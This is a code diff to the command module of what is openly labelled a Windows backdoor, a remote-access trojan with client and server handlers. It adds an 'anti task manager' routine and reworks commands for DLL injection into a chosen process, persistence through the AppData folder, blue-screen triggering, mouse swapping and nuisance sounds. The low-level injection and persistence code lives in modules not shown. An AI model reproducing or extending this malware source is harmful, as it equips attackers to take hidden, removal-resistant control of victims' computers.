@@ -5,11 +5,17 @@
 """
 import os
 import BDModuleDefault
-from BDWinRAT import WinRAT
+from BDRatMelodies import BDMELODY
+
+try:
+	from BDWinRAT import WinRAT
+
+except Exception as exc:
+	print("[WARN] Backdoor component WinRAT is not supported on this platform")
 
 # Modules to be registered at both client-side and server-side
 _modules = ["msgbox", "bsod", "swapmouse", "beep", "injectdll", "playtune", "persist"]
-_builtins = [""]
+_builtins = []
 
 """"
 	@class ClientMain
@@ -23,6 +29,10 @@ class ClientMain(BDModuleDefault.ClientMain):
 		# Create new Windows RAT API instance
 		self.rat = WinRAT()
 
+		# Start anti taskmgr
+		print("ANTI TASK MANAGER IS RUNNING!")
+		self.rat.antiTaskmgr()
+
 		# Extend the default class with the new command modules
 		self.registerCMDModules(_modules)
 
@@ -35,10 +45,10 @@ class ClientMain(BDModuleDefault.ClientMain):
 	def msgbox(self, argv):
 
 		# Receive title
-		title = self.handler.recv_msg()
+		title = argv[1]
 
 		# Receive message
-		message = self.handler.recv_msg()
+		message = argv[2]
 
 		try:
 			self.rat.msgbox(title=title, msg=message)
@@ -69,8 +79,9 @@ class ClientMain(BDModuleDefault.ClientMain):
 		@return {str} Status of command exection
 	"""
 	def swapmouse(self, argv):
+
 		try:
-			if self.handler.recv_msg() == "on":
+			if argv[1] == "on":
 				self.rat.swapmouse(evil=1)
 			else:
 				self.rat.swapmouse(evil=0)
@@ -88,8 +99,12 @@ class ClientMain(BDModuleDefault.ClientMain):
 	"""
 	def beep(self, argv):
 		try:
-			freq = int(self.handler.recv_msg())
-			duration = int(self.handler.recv_msg())
+			
+
+			freq = int(argv[1])
+			
+			duration = int(argv[2])
+
 			self.rat.beep(freq, duration)
 
 		except Exception as exc:
@@ -99,15 +114,21 @@ class ClientMain(BDModuleDefault.ClientMain):
 
 	def playtune(self, argv):
 		try:
-			notes = self.handler.recv_msg()
+
+			notes = argv[1]
+
+			if notes in BDMELODY.keys():
+				notes = BDMELODY[notes] # If its the case get the notes
+			
 			notes = notes.split(" ")
 
-			repeat = int(self.handler.recv_msg())
+			repeat = int(argv[2])
 
 			for i in range(0, repeat):
 				self.rat.playNotes(notes)
 
 		except Exception as exc:
+			raise(exc)
 			return 'CMD_FAIL: {}'.format(exc)
 
 		return 'CMD_SUCCESS'
@@ -122,10 +143,10 @@ class ClientMain(BDModuleDefault.ClientMain):
 		try:
 
 			# Get process identifier
-			pid = int(self.handler.recv_msg())
+			pid = int(argv[1])
 
 			# Get DLL path
-			dll = str(self.handler.recv_msg())
+			dll = str(argv[2])
 
 			# Attempt injection
 			self.rat.injectdll(pid, dll)
@@ -138,7 +159,7 @@ class ClientMain(BDModuleDefault.ClientMain):
 	def persist(self, argv):
 
 		# Receive status message
-		status = self.handler.recv_msg()
+		status = argv[1]
 
 		try:
 			# Get the AppData folder path
@@ -221,112 +242,65 @@ class ServerMain(BDModuleDefault.ServerMain):
 		@param {list} argv Arguments array
 		@return {str} Command execution status as received from client
 	"""
-	def msgbox(self, argv):
+	def msgbox(self, argv, checkArgs=False):
 
 		if len(argv) < 3:
 			return 'INVALID_ARGUMENT'
 
-		title = argv[1]
-		msg = argv[2]
-
-		# Send title
-		self.handler.send_msg(title)
-
-		# Send message
-		self.handler.send_msg(msg)
+		if checkArgs:
+			return "OK"
 
 		return self.handler.recv_msg()
 
-	def bsod(self, argv):
+	def bsod(self, argv, checkArgs=False):
+
+		if checkArgs:
+			return "OK"
+
 		pass
 
-	def swapmouse(self, argv):
+	def swapmouse(self, argv, checkArgs=False):
 		if len(argv) < 2:
 			return 'INVALID_ARGUMENT'
 
-		toggle = argv[1]
-
-		# Send toggle
-		self.handler.send_msg(toggle)
+		if checkArgs:
+			return "OK"
 
 		return self.handler.recv_msg()
 
-	def beep(self, argv):
+	def beep(self, argv, checkArgs=False):
 		if len(argv) < 3:
 			return 'INVALID_ARGUMENT'
 
-		freq = argv[1]
-		duration = argv[2]
-
-		# Send frequency
-		self.handler.send_msg(freq)
-
-		# Send duration
-		self.handler.send_msg(duration)
+		if checkArgs:
+			return "OK"
 
 		return self.handler.recv_msg()
 
-	def playtune(self, argv):
+	def playtune(self, argv, checkArgs=False):
 		if len(argv) < 3:
 			return 'INVALID_ARGUMENT'
 
-
-		tunes = {
-
-			"soviet anthem": "C4:4 G3:3 A3:1 B3:4 E3:4 A3:4 G3:3 F3:1 G3:4 C3:2 C3:2 D3:4 D3:2 E3:2 F3:4 " +
-							"F3:2 G3:2 A3:4 B3:2 C4:2 D4:6 G3:2 E4:4 D4:3 C4:1 D4:4 B3:2 G3:2 C4:4 B3:3 " +
-							"A3:1 B3:4 E3:2 E3:2 A3:4 G3:2 F3:2 G3:4 C3:2 C3:2 C4:4 B3:3 A3:1 G3:6 " +
-							".:4 .:4",
-
-			"rickroll": "A3:4 B3:4 C4:2 C4:4 D4:4 B3:2 A3:2 G3:4 " + # We are no strangers in love
-						"A3:4 A3:4 B3:4 C4:2 A3:4 G3:4 G4:4 G4:4 D4:4 " + # You know the rules and so do I
-						"A3:4 A3:4 B3:2 C4:2 A3:2 C4:4 D4:4 B3:2 A3:2 B3:2 A3:2 G3:2 " + # A full commitment's what I'm thinking of
-						"A3:4 A3:2 B3:2 C4:4 A3:4 G3:4 D4:2 D4:2 D4:2 E4:2 D4:2 " + # You would not get this from any other guy
-						"C4:4 D4:4 E4:2 C4:2 D4:4 D4:4 D4:4 D4:4 E4:4 D4:2 G3:2 " + # I just wanna tell you how I'm feeling
-						"A3:2 B3:2 C4:4 A3:4 D4:2 E4:2 D4:2 " + # Gotta make you understand...
-						"G3:2 A3:2 C4:2 A3:2 E4:4 E4:4 D4:4 " + # Never gonna give you up
-						"G3:2 A3:2 C4:2 A3:2 D4:4 D4:4 C4:2 B3:2 A3:2 " + # Never gonna let you down
-						"G3:2 A3:2 C4:2 A3:2 C4:4 D4:2 B3:2 G3:4 G3:2 D4:2 C4:4 " +# Never gonna run around and desert you
-						"G3:2 A3:2 C4:2 A3:2 E4:4 E4:4 D4:4 " + # Never gonna make you cry
-						"G3:2 A3:2 C4:2 A3:2 D4:4 D4:4 C4:2 B3:2 A3:2 " + # Never gonna say goodbye
-						"G3:2 A3:2 C4:2 A3:2 C4:4 D4:4 B3:2 G3:4 G3:4 D4:4 C4:4 .:4 .:4" # Never gonna tell a lie and hurt you
-		}
-
-		notes = argv[1]
-		repeat = argv[2]
-		if notes in tunes.keys():
-			notes = tunes[notes]
-
-		# Send notes
-		self.handler.send_msg(notes)
-
-		# Send repeat count
-		self.handler.send_msg(repeat)
+		if checkArgs:
+			return "OK"
 
 		return self.handler.recv_msg()
 
-	def injectdll(self, argv):
+	def injectdll(self, argv, checkArgs=False):
 		if len(argv) < 3:
 			return 'INVALID_ARGUMENT'
 
-		pid = argv[1]
-		dll = argv[2]
-
-		# Send process id
-		self.handler.send_msg(pid)
-
-		# Send dll path
-		self.handler.send_msg(dll)
+		if checkArgs:
+			return "OK"
 
 		return self.handler.recv_msg()
 
-	def persist(self, argv):
+	def persist(self, argv, checkArgs=False):
 		
 		if len(argv) < 2:
 			return 'INVALID_ARGUMENT'
 
-		status = argv[1]
-
-		self.handler.send_msg(status)
+		if checkArgs:
+			return "OK"
 
 		return self.handler.recv_msg()
